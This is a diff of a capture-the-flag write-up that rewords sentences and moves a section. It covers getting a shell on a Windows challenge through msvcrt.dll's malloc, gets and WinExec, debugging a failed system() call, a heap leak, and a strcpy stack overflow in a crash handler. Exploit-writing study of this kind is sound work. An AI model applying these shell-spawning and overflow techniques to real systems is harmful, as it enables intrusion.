@@ -1272,7 +1272,7 @@ The most important thing is that the `__GI___libc_read` function, as we would ex
 
 If you restart the process and look at it again, you will see that the all libraries are mapped to different addresses each time, while the addresses of the 'msvcrt.dll' libraries mostly remain the same.
 
-When it call to `LoadLibrary` to get the base address of module `msvcrt.dll` 
+It's called the LoadLibrary function and passes the `msvcrt.dll` as an argument to get the base of the `msvcrt.dll` module.
 
 ```c
     HMODULE msvcrt = LoadLibrary("msvcrt.dll");
@@ -1318,7 +1318,7 @@ Note that the distribution file also includes `kernel32.dll` and `msvcrt.dll`.
 ### Method 1
 
 1. I call the malloc function of msvcrt.dll with an appropriate size as an argument to allocate memory and obtain the address.
-2. I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command '/bin/bash' =))
+2. I call the gets function of msvcrt.dll with the address in step 1 as an argument, then enter the command `/bin/bash` =))
 3. Call 'WinExec' and pass the address of the string as an argument, and we get a shell.
 
 
@@ -1375,9 +1375,9 @@ io.interactive()
 
 But when running, it failed and returned -1, I don't know why it happened.
 
-> If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn't found, returns 0 and sets errno to ENOENT. If command isn't NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values:
-
 According to Microsoft's system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable `errno`.
+
+> If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn't found, returns 0 and sets errno to ENOENT. If command isn't NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values.
 
 So I leveraged the [_get_errno](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170) function to to get the current value of the errno global variable.
 
@@ -1449,7 +1449,7 @@ b'Result: 0\r\n'
 b'Which module would you like to load?\r\n'
 ```
 
-By referring to this [page](https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170), I see that ENOENT has a value equal to 2, so it's equivalent to the error string `the command interpreter can't be found`. 
+By referring to this [page](https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170), I see that `ENOENT` has a value equal to 2, so it's equivalent to the error string `the command interpreter can't be found`. 
 
 ## Solve script
 
@@ -1798,43 +1798,6 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 
 Since the value doesn't overwrite when they are NaN and because after malloc, the memory isn't properly initialized. So we can leverage that to have a strong leak through the `draw_graph` function.
 
-### Stack overflow
-
-```c
-char *__cdecl find_abort_string(uint64_t rsp_0)
-{
-  int i; // [rsp+14h] [rbp-3Ch]
-  uint64_t *p; // [rsp+18h] [rbp-38h]
-  char format[32]; // [rsp+20h] [rbp-30h] BYREF
-  uint64_t rsp_0a; // [rsp+40h] [rbp-10h]
-
-  rsp_0a = rsp_0;
-  memset(format, 0, sizeof(format));
-  p = (uint64_t *)rsp_0a;
-  for ( i = 0; i < 500; ++i )
-  {
-    if ( *p == 'essA :)(' )
-    {
-      strcpy(format, (const char *)p);
-      return strdup(format);
-    }
-    ++p;
-  }
-  return 0LL;
-}
-```
-
-In the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the `strcpy` function.
-
-Since strcpy terminates when it encounters a null byte, we can't perform a rop chain, so I will choose the following gadget to cause stack overflow again. Fortunately, the stack address remains in the RDI register.
-```c
-.text:00000000004025A1                 mov     rax, cs:stdin_ptr
-.text:00000000004025A8                 mov     rdx, [rax]      ; stream
-.text:00000000004025AB                 mov     esi, 0C8h       ; n
-.text:00000000004025B0                 call    _fgets
-```
-
-
 ## Trigger the bug
 
 First, I created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin
@@ -1910,6 +1873,42 @@ log.info("libc " + hex(libc.address))
 io.interactive()
 ```
 
+
+### Stack overflow
+
+```c
+char *__cdecl find_abort_string(uint64_t rsp_0)
+{
+  int i; // [rsp+14h] [rbp-3Ch]
+  uint64_t *p; // [rsp+18h] [rbp-38h]
+  char format[32]; // [rsp+20h] [rbp-30h] BYREF
+  uint64_t rsp_0a; // [rsp+40h] [rbp-10h]
+
+  rsp_0a = rsp_0;
+  memset(format, 0, sizeof(format));
+  p = (uint64_t *)rsp_0a;
+  for ( i = 0; i < 500; ++i )
+  {
+    if ( *p == 'essA :)(' )
+    {
+      strcpy(format, (const char *)p);
+      return strdup(format);
+    }
+    ++p;
+  }
+  return 0LL;
+}
+```
+
+In the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the `strcpy` function.
+
+Since strcpy terminates when it encounters a null byte, we can't perform a rop chain, so I will choose the following gadget to cause stack overflow again. Fortunately, the stack address remains in the RDI register.
+```c
+.text:00000000004025A1                 mov     rax, cs:stdin_ptr
+.text:00000000004025A8                 mov     rdx, [rax]      ; stream
+.text:00000000004025AB                 mov     esi, 0C8h       ; n
+.text:00000000004025B0                 call    _fgets
+```
 
 ## Solve script
 
